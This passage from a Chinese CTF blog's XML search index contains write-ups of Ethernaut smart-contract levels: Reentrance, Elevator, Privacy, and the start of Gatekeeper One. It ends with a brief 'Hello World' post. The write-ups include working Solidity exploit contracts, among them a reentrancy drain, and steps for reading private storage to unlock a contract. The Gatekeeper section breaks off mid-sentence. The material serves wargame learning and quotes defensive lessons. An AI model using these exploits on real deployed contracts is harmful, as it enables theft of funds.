解题思路这是一个比较著名的重入漏洞，漏洞点在withdraw，它会先判断账户是否有那么多余额在调用call进行转账，然后再将balances中的金额减少。但是我们前面说过call过去的地址如果是个合约地址，并且合约的fallback函数也调用了withdraw函数，那么这就会成为一个递归问题，一直到gas=0才会停止。div style=”width: 50%; margin: auto”&gt;所以我们可以利用这个机制编写合约将钱全部提出。 具体步骤1.编写exp合约12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract exp &#123; address instance_address = 0xdc8941b8396a3140b008d124fcd149acd2005eff; Reentrance target = Reentrance(instance_address); function exp() payable&#123;&#125; function donate() public payable &#123; target.donate.value(msg.value)(this); &#125; function attack() public &#123; //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125; function get_balance() public view returns(uint) &#123; return target.balanceOf(this); &#125; function my_eth_bal() public view returns(uint) &#123; return address(this).balance; &#125; function ins_eth_bal() public view returns(uint) &#123; return instance_address.balance; &#125; function () public payable &#123; //同理写两次 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125;&#125; 2.调用donate方法捐款2ETH 3.调用attack方法进行攻击，可以看见钱全部在我们这里并且整数溢出了 攻击后的结果 4.点击submit instance即可过关。 通关后的彩蛋 Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don’t interrupt the execution flow when the receiving contract fails.Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.Re-entrancy is a common attack. You should always be prepared for it! The DAO HackThe famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack. level 11- Elevator题目链接 胜利条件1.将top设为true tips1.有时solidity语言不能保持诺言.2.Elevator可以被Building利用. 源码123456789101112131415161718192021pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; 预备知识1.view关键字可以大概查看这篇文章了解一下 解题思路1.第一个方法是在我们自己设置的合约里面设置一个变量为true，每次调用isLastFloor函数的时候将该变量取反并返回。这是可行的，因为： 当前 Solidity 编译器没有强制执行视图函数（view function）或常量函数（constant function）不能修改状态。而且也没有强制纯函数（pure function）不读取状态信息。所以声明一个 view 和 pure 函数，并不保证就不修改数据状态。 2.第二个方法是我们每次调用isLastFloor函数的时候通过判断gas的奇偶来返回true or flase,一定概率下是可以碰撞成功的 具体步骤1.编写exp合约a.第一种方法123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract exp &#123; address instance_address = 0x71e4e8947b9755da6b649e6ce86394e6a4e796bf; Elevator e = Elevator(instance_address); bool public isLast = true; function isLastFloor(uint) public returns (bool) &#123; isLast = ! isLast; return isLast; &#125; function attack() public &#123; e.goTo(100); &#125;&#125; b.第二种方法123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract exp &#123; address instance_address = 0x71e4e8947b9755da6b649e6ce86394e6a4e796bf; Elevator e = Elevator(instance_address); function isLastFloor(uint) public returns (bool) &#123; return (gasleft())%2==0; #低版本可以使用msg.gas &#125; function attack() public &#123; e.goTo(100); &#125;&#125; 2.调用attack()方法3.点击submit instance即可过关。 通关后的彩蛋 Currently, the Solidity compiler does nothing to enforce that a view or constant function is not modifying state. The same applies to pure functions, which should not read state but they can. Make sure you read Solidity’s documentation and learn its caveats.An alternative way to solve this level is to build a view function which returns different results depends on input data but don’t modify state, e.g. gasleft(). level 12- Privacy题目链接 胜利条件1.调用unlock函数将locked设为false tips1.了解storage,parameter parsing和casting是如何工作的2.使用remix或使用自己搭载的web3提供程序 源码123456789101112131415161718192021222324252627282930pragma solidity ^0.4.18;contract Privacy &#123; bool public locked = true; uint256 public constant ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; function Privacy(bytes32[3] _data) public &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */&#125; 预备知识1.如何读取合约的storage web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)}); //其中0可以换成1，2，32.变量存储规则根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。constant常量是无需存储的 解题思路1.通过读取storage得到一系列数据并找出data[2]提交到unlock函数解锁 具体步骤1.读取合约的storage123450x0000000000000000000000000000000000000000000000000000007b3ff0a010x79a1ed4c7ba7bbe11d264f4ee6c1d980fe0e5087e9baf770a19f7fe605dcd4340xbbd5d1cf216d04652f128560551961bdb24c58cd4a50182a6ff2c19b0e1e5e060xd83aa7d5f6da7a858cc7a3646ab832ab7a7429a433c98cca8bb859436d8ad5e20x0000000000000000000000000000000000000000000000000000000000000000 2.进行分析除了ID常量不用存储，其他的常量分别如下：a.bool public locked = true 占 1 字节 -&gt; 01b.uint8 private flattening = 10 占 1 字节 -&gt; 0ac.uint8 private denomination = 255 占 1 字节 -&gt; ffd.uint16 private awkwardness = uint16(now) 占 2 字节 -&gt; 07b3刚好也就对应storage中的第一行最后的07b3ff0a01,则data[2]就应该是第四行的数据,由于是byte16，则提交前16个字节就行，也就是d83aa7d5f6da7a858cc7a3646ab832ab 3.将data[2]提交到unlock函数里 await contract.unlock(web3.toAscii(‘d83aa7d5f6da7a858cc7a3646ab832ab’)) 4.点击submit instance即可过关。 通关后的彩蛋 level 13- Gatekeeper One题目链接 胜利条件1.通过gatekeeper并注册成为entrant tips1.前面的Telephone和Token关卡学到的东西很有用2.您可以在Solidity的文档中了解有关msg.gas特殊变量或其首选别名gasleft()的更多信息（请参阅这个和此处）。 源码12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; 解题思路1.对于gateOne,我们可以通过自己编写一个合约去调用gateOne从而绕过，此时tx.origin是我们的钱包地址，msg.sender是编写的合约地址2.对于gateTwo,我们需要通过debugger找出msg.gas是8191倍数的时候3.对于gateThree,我们]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F01%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Start这个博客主要用来记录一些有关ctf的知识因为自己太健忘了，不记录下会出事的而且搭个博客以后AWD就不用再坐着发呆了，起码有点东西可以看本博客主要分为web和crypto两个方向，也是我现在负责的两个方向希望自己多多加油吧！最后来个常规操作 1$ ehco "Hello world"]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
</search>
